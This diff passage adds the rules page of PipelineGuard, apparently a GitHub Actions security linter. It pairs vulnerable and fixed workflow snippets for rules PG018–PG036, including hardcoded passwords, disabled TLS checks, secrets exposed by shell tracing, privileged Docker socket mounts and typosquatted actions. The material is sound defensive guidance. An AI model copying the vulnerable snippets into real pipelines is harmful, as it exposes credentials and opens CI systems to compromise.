+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- env:
+    TARGET: ${{ inputs.environment }}
+  run: ./deploy.sh &quot;$TARGET&quot;</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="step-output-injection">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG018, step-output-injection</span></div>
+            <h2>Step or job output is pasted into a shell script</h2>
+            <p>Outputs often carry text that came from somewhere else: a branch name, a file, an API response. Expanding <code>${{ steps.x.outputs.y }}</code> straight into run: makes that text code.</p>
+            <p><b>How to fix it.</b> Map the output to an env: variable and quote it in the script.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: echo &quot;${{ steps.meta.outputs.title }}&quot;</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- env:
+    TITLE: ${{ steps.meta.outputs.title }}
+  run: echo &quot;$TITLE&quot;</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-high" id="always-true-if">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--high">High</span><span class="finding__id">PG019, always-true-if</span></div>
+            <h2>if: condition is always true</h2>
+            <p>When an if: mixes <code>${{ }}</code> with text outside the braces, GitHub evaluates the whole thing as a non-empty string, which is truthy. Your guard, often a security check, never blocks anything.</p>
+            <p><b>How to fix it.</b> Write the condition without <code>${{ }}</code>, or put the entire expression inside one pair of braces.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>if: ${{ github.actor }} == 'dependabot[bot]'</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>if: github.actor == 'dependabot[bot]'</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-high" id="literal-credential-input">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--high">High</span><span class="finding__id">PG020, literal-credential-input</span></div>
+            <h2>Password or token is passed as plain text to an action</h2>
+            <p>An input named password, token, secret or api-key has a literal value instead of a secrets reference. It's readable by anyone who can read the repo and it lives forever in git history.</p>
+            <p><b>How to fix it.</b> Store the value as a repository or environment secret and reference it with <code>${{ secrets.NAME }}</code>.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>with:
+  password: hunter2</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>with:
+  password: ${{ secrets.REGISTRY_PASSWORD }}</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="github-token-in-script">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG021, github-token-in-script</span></div>
+            <h2>GITHUB_TOKEN is written into a run script</h2>
+            <p><code>${{ github.token }}</code> or <code>${{ secrets.GITHUB_TOKEN }}</code> inside run: lands in the generated script on disk and is easy to leak through echo, set -x or a curl -v.</p>
+            <p><b>How to fix it.</b> Pass it as GH_TOKEN through env: and let the gh CLI or your tool read it from the environment.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: gh pr comment 1 --body hi -R x/y --token ${{ github.token }}</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- env:
+    GH_TOKEN: ${{ github.token }}
+  run: gh pr comment 1 --body hi</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="tls-verification-disabled">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG022, tls-verification-disabled</span></div>
+            <h2>TLS certificate checks are turned off</h2>
+            <p>curl -k, wget --no-check-certificate, NODE_TLS_REJECT_UNAUTHORIZED=0, GIT_SSL_NO_VERIFY or StrictHostKeyChecking=no let anyone on the network path swap what you download or where you push.</p>
+            <p><b>How to fix it.</b> Fix the certificate chain or pin the host key (ssh-keyscan into known_hosts) instead of disabling verification.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: curl -k https://artifacts.internal/tool.tgz -o tool.tgz</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- run: curl --cacert ca.pem https://artifacts.internal/tool.tgz -o tool.tgz</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="trace-with-secrets">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG023, trace-with-secrets</span></div>
+            <h2>Shell tracing is on in a step that has secrets</h2>
+            <p>set -x prints every command after expansion. Masking only catches exact secret values, so anything derived from a secret (base64, URL-encoded, part of a header) is printed in clear text.</p>
+            <p><b>How to fix it.</b> Remove set -x from steps that receive secrets, or turn it off around the commands that use them.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- env:
+    TOKEN: ${{ secrets.API_TOKEN }}
+  run: |
+    set -x
+    curl -H &quot;Authorization: Bearer $TOKEN&quot; ...</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- env:
+    TOKEN: ${{ secrets.API_TOKEN }}
+  run: |
+    curl -sf -H &quot;Authorization: Bearer $TOKEN&quot; ...</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="artifact-uploads-workspace">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG024, artifact-uploads-workspace</span></div>
+            <h2>Whole workspace is uploaded as an artifact</h2>
+            <p>Uploading . or ** includes .git/config, which holds the checkout token unless persist-credentials is false. Artifacts on public repos can be downloaded by anyone.</p>
+            <p><b>How to fix it.</b> Upload only the build output directory, and set <code>persist-credentials: false</code> on checkout.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- uses: actions/upload-artifact@v4
+  with:
+    path: .</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- uses: actions/upload-artifact@v4
+  with:
+    path: dist/</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="cache-in-privileged-workflow">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG025, cache-in-privileged-workflow</span></div>
+            <h2>Cache is used in a privileged workflow</h2>
+            <p><code>pull_request_target</code> and <code>workflow_run</code> run on the base branch, so the cache they write is shared with your main branch. Code from a fork that can write the cache can poison what your release jobs restore later.</p>
+            <p><b>How to fix it.</b> Don't restore or save caches in privileged workflows. Keep caching in unprivileged <code>pull_request</code> and push jobs.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>on: pull_request_target
+...
+  - uses: actions/cache@v4</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>on: pull_request
+...
+  - uses: actions/cache@v4</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="deprecated-workflow-command">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG026, deprecated-workflow-command</span></div>
+            <h2>Uses the removed set-output / save-state commands</h2>
+            <p>::set-output and ::save-state were deprecated because log output could inject values. Runners now warn and will fail on them.</p>
+            <p><b>How to fix it.</b> Write to $GITHUB_OUTPUT and $GITHUB_STATE instead.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: echo &quot;::set-output name=tag::v1&quot;</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- run: echo &quot;tag=v1&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="archived-action">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG027, archived-action</span></div>
+            <h2>Action is archived and no longer maintained</h2>
+            <p>Archived actions such as actions/create-release, actions/upload-release-asset and actions/setup-ruby get no security fixes and often run on retired Node versions.</p>
+            <p><b>How to fix it.</b> Switch to the maintained replacement, for example softprops/action-gh-release or the gh CLI for releases and ruby/setup-ruby for Ruby.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- uses: actions/create-release@v1</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- env:
+    GH_TOKEN: ${{ github.token }}
+  run: gh release create &quot;$GITHUB_REF_NAME&quot; dist/*</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="retired-runner-image">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG028, retired-runner-image</span></div>
+            <h2>Job targets a retired runner image</h2>
+            <p>Images such as ubuntu-18.04, ubuntu-20.04, windows-2019 and macos-12 have been removed. Jobs queue forever or fail, and old images miss security patches.</p>
+            <p><b>How to fix it.</b> Move to a current image such as ubuntu-24.04, or ubuntu-latest if you accept automatic upgrades.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>runs-on: ubuntu-20.04</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>runs-on: ubuntu-24.04</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="previously-compromised-action">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG029, previously-compromised-action</span></div>
+            <h2>Action had a publicly reported compromise</h2>
+            <p>tj-actions/changed-files and reviewdog actions had their tags rewritten to steal CI secrets in 2025. Tag references to them are only as safe as their current maintainers' accounts.</p>
+            <p><b>How to fix it.</b> Pin to a SHA you have reviewed, or replace the action with a few lines of git and shell.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- uses: tj-actions/changed-files@v45</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- run: git diff --name-only &quot;$BASE_SHA&quot; HEAD</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-high" id="typosquatted-action">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--high">High</span><span class="finding__id">PG030, typosquatted-action</span></div>
+            <h2>Action name looks like a typo of a popular action</h2>
+            <p>Names such as actons/checkout or action/checkout belong to someone else. Typosquatted actions are a known way to slip malicious code into pipelines.</p>
+            <p><b>How to fix it.</b> Correct the owner and name, then pin to a SHA.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- uses: actons/checkout@v4</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- uses: actions/checkout@&lt;sha&gt; # v4</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-medium" id="privileged-container">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--medium">Medium</span><span class="finding__id">PG031, privileged-container</span></div>
+            <h2>Container runs with --privileged or the Docker socket</h2>
+            <p>--privileged, or mounting /var/run/docker.sock, gives the container root on the runner host. On self-hosted runners that host persists between jobs.</p>
+            <p><b>How to fix it.</b> Drop --privileged and add only the specific capabilities you need. Use rootless BuildKit or Kaniko for image builds.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock tool</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- run: docker run --rm --cap-add NET_ADMIN tool</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="unlocked-dependency-install">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG032, unlocked-dependency-install</span></div>
+            <h2>Dependencies are installed without the lockfile</h2>
+            <p>npm install and yarn install without --frozen-lockfile can resolve newer versions than the ones you reviewed. A compromised release published minutes ago lands in your build.</p>
+            <p><b>How to fix it.</b> Use npm ci, yarn install --frozen-lockfile (or --immutable), pnpm install --frozen-lockfile, or pip install --require-hashes.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: npm install</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- run: npm ci</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="broad-oidc-permission">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG033, broad-oidc-permission</span></div>
+            <h2>OIDC id-token: write is granted to the whole workflow</h2>
+            <p>id-token: write lets a job mint cloud credentials. Granted at the top level, every job and every action in it can request a token for your AWS, GCP or Azure roles.</p>
+            <p><b>How to fix it.</b> Grant id-token: write only on the deploy job that assumes the role.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>permissions:
+  id-token: write
+  contents: read</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>jobs:
+  deploy:
+    permissions:
+      id-token: write
+      contents: read</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-info" id="deploy-without-concurrency">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--info">Info</span><span class="finding__id">PG034, deploy-without-concurrency</span></div>
+            <h2>Deploy workflow can run twice at the same time</h2>
+            <p>Two pushes in quick succession start two deploys that race each other. The older commit can finish last and quietly roll production back.</p>
+            <p><b>How to fix it.</b> Add a concurrency group so deploys queue instead of overlapping.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>name: deploy
+on:
+  push:
+    branches: [main]</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>name: deploy
+on:
+  push:
+    branches: [main]
+concurrency:
+  group: deploy-production
+  cancel-in-progress: false</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="workflow-run-any-branch">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG035, workflow-run-any-branch</span></div>
+            <h2>workflow_run trigger has no branch filter</h2>
+            <p>Without branches:, the privileged <code>workflow_run</code> job also fires for runs on fork pull request branches, which widens what untrusted code can influence.</p>
+            <p><b>How to fix it.</b> Add branches: [main] (or your release branches) under the <code>workflow_run</code> trigger.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>on:
+  workflow_run:
+    workflows: [ci]
+    types: [completed]</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>on:
+  workflow_run:
+    workflows: [ci]
+    types: [completed]
+    branches: [main]</code></pre></figure>
+            </div>
+          </div>
+        </article>
+        <article class="rule sev-low" id="unchecked-failure">
+          <span class="rule__band" aria-hidden="true"></span>
+          <div class="rule__body">
+            <div class="finding__top"><span class="tag tag--low">Low</span><span class="finding__id">PG036, unchecked-failure</span></div>
+            <h2>Security or test step is allowed to fail silently</h2>
+            <p>continue-on-error: true on a scan, audit, lint or test step means the build stays green even when the check finds a problem, so nobody looks.</p>
+            <p><b>How to fix it.</b> Remove continue-on-error, or keep it and fail a later step if the check reported issues.</p>
+            <div class="rule__pair">
+              <figure><figcaption>Vulnerable</figcaption><pre class="code"><code>- run: npm audit --audit-level=high
+  continue-on-error: true</code></pre></figure>
+              <figure><figcaption>Fixed</figcaption><pre class="code"><code>- run: npm audit --audit-level=high</code></pre></figure>
+            </div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </main>
+  <footer class="footer">
+    <div class="wrap footer__inner">
+      <p>PipelineGuard was built by <a href="https://yousafkhamza.github.io/" rel="author">Yousaf Hamza</a> (Yousaf K Hamza), a DevOps and platform engineer in Dubai. It's open source under the MIT licence.</p>
+      <p><a href="https://github.com/yousafkhamza/pipelineguard">Source on GitHub</a> <span aria-hidden="true">/</span> <a href="https://github.com/yousafkhamza/pipelineguard/issues/new">Suggest a rule</a></p>
+    </div>
+  </footer>
+</body>
+</html>
